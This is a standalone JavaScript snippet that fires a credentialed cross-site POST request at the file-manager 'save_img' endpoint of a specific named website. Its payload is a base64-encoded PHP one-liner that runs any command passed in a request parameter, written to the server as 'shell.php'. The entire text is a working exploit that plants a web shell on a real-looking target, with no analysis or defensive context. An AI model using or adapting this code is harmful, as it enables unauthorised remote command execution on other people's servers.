function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/www.motusaa.co.za\/admin\/filemanager\/ajax_calls.php?action=save_img", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
        xhr.withCredentials = true;
        var body = "url=data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==&path=&name=shell.php";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
submitRequest();
